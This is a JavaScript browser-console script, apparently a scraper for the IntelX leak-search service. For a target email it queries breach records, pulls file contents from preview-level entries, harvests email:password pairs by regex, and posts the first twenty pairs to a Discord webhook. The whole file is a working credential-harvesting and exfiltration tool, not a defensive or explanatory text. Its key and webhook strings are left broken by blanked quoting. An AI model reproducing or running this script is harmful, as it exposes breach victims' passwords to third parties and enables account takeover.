// IntelX Console Scraper v3 - Uses file/view to extract Preview records
// Paste in browser console on https://intelx.io/?s=TARGET_EMAIL

(async function() {
    'use strict';

    const API_URL = 'https://public.intelx.io/';
    const API_KEY = ';
    const WEBHOOK = ';
    const DELAY = ms => new Promise(r => setTimeout(r, ms));
    const LOG = msg => console.log(`%c[IntelX] ${msg}`, 'color: #00ff00; font-weight: bold;');

    let email = new URLSearchParams(window.location.search).get('s');
    if (!email) {
        email = prompt('Enter email to search:', 'test@gmail.com');
        if (!email) return LOG('Cancelled');
    }

    LOG(`Searching: ${email}`);

    // Step 1: Search
    let searchResp = await fetch(API_URL + 'intelligent/search', {
        method: 'POST',
        headers: { 'x-key': API_KEY, 'Content-Type': 'application/json' },
        body: JSON.stringify({ term: email, maxresults: 1000, timeout: 30, sort: 2 })
    });
    let searchData = await searchResp.json();
    let searchId = searchData.id;
    if (!searchId) return LOG('Search failed: ' + JSON.stringify(searchData));
    LOG(`Search ID: ${searchId}`);

    // Step 2: Poll results
    let allResults = [];
    let seenIds = new Set();
    let attempts = 0;

    while (attempts < 60) {
        await DELAY(2000);
        attempts++;
        let r = await fetch(API_URL + `intelligent/search/result?id=${searchId}&limit=1000&previewlines=0&statistics=1`, {
            headers: { 'x-key': API_KEY }
        });
        let data = await r.json();
        if (data.status === 3) continue;

        let records = data.records || [];
        for (let rec of records) {
            if (!seenIds.has(rec.systemid)) {
                seenIds.add(rec.systemid);
                allResults.push(rec);
            }
        }
        if (records.length < 1000) break;
    }

    LOG(`Total records: ${allResults.length}`);

    // Step 3: Categorize
    let accessible = allResults.filter(r => r.accesslevel === 0);
    let preview = allResults.filter(r => r.accesslevel === 4);
    let pro = allResults.filter(r => r.accesslevel === 6);

    LOG(`Accessible: ${accessible.length} | Preview: ${preview.length} | PRO: ${pro.length}`);

    // Step 4: Extract content from Preview + Accessible records
    let extracted = [];
    let allPairs = [];
    let allEmails = [];
    let targets = [...accessible, ...preview];

    LOG(`Extracting content from ${targets.length} records...`);

    for (let i = 0; i < targets.length; i++) {
        let rec = targets[i];
        try {
            let resp = await fetch(API_URL + `file/view?f=0&storageid=${rec.storageid}&bucket=${rec.bucket}&k=${API_KEY}&license=public`, {
                headers: { 'x-key': API_KEY }
            });
            if (resp.ok) {
                let content = await resp.text();
                if (content && !content.includes('████') && content.trim().length > 10) {
                    // Extract email:password pairs
                    let pairRegex = /([\w.+-]+@[\w.-]+\.\w+)[:\|;](\S+)/g;
                    let match;
                    while ((match = pairRegex.exec(content)) !== null) {
                        allPairs.push({ email: match[1], password: match[2] });
                    }

                    // Extract emails
                    let emailRegex = /[\w.+-]+@[\w.-]+\.\w+/g;
                    let emailMatch;
                    while ((emailMatch = emailRegex.exec(content)) !== null) {
                        allEmails.push(emailMatch[0]);
                    }

                    extracted.push({
                        name: rec.name,
                        date: rec.date,
                        bucket: rec.bucketh,
                        media: rec.mediah,
                        contentLength: content.length,
                        contentPreview: content.substring(0, 500),
                    });

                    LOG(`[${i+1}/${targets.length}] ${rec.name}: ${content.length} chars`);
                }
            }
        } catch (e) {
            LOG(`[${i+1}/${targets.length}] Error: ${e.message}`);
        }
    }

    // Deduplicate
    let uniqueEmails = [...new Set(allEmails)];
    let uniquePairs = [...new Set(allPairs.map(p => `${p.email}:${p.password}`))].map(s => {
        let [e, p] = s.split(':');
        return { email: e, password: p };
    });

    // Summary
    LOG('\n========================================');
    LOG(`SEARCH: ${email}`);
    LOG(`Total: ${allResults.length} | Extracted: ${extracted.length}`);
    LOG(`Emails found: ${uniqueEmails.length} | Pairs found: ${uniquePairs.length}`);
    LOG('========================================');

    if (extracted.length > 0) {
        console.log('\n--- EXTRACTED RECORDS ---');
        extracted.forEach(r => {
            console.log(`${r.name} (${r.date})`);
            console.log(`  Content preview: ${r.contentPreview.substring(0, 200)}`);
        });
    }

    if (uniquePairs.length > 0) {
        console.log('\n--- EMAIL:PASSWORD PAIRS ---');
        uniquePairs.slice(0, 50).forEach(p => console.log(`${p.email}:${p.password}`));
    }

    // Send to Discord
    let summary = `**IntelX: \`${email}\`**\n`;
    summary += `Total: **${allResults.length}** | Extracted: **${extracted.length}** | Emails: **${uniqueEmails.length}** | Pairs: **${uniquePairs.length}**\n\n`;

    if (extracted.length > 0) {
        summary += '**Extracted Records:**\n';
        extracted.slice(0, 15).forEach(r => {
            summary += `• \`${r.name.substring(0, 50)}\` (${(r.date || '').substring(0, 10)})\n`;
        });
    }

    if (uniquePairs.length > 0) {
        summary += `\n**Pairs (first 20):**\n`;
        uniquePairs.slice(0, 20).forEach(p => {
            summary += `\`${p.email}:${p.password}\`\n`;
        });
    }

    try {
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'IntelX Scraper',
                embeds: [{ title: `IntelX: ${email}`, description: summary.substring(0, 4000), color: 0x00FF00 }]
            })
        });
        LOG('Sent to Discord!');
    } catch (e) {
        LOG('Discord error: ' + e.message);
    }

    // Save globally
    window.__intelx = { email, allResults, extracted, uniqueEmails, uniquePairs };
    LOG('Results saved to window.__intelx');
    LOG('Copy pairs: copy(window.__intelx.uniquePairs.map(p => p.email+":"+p.password).join("\\n"))');

})();
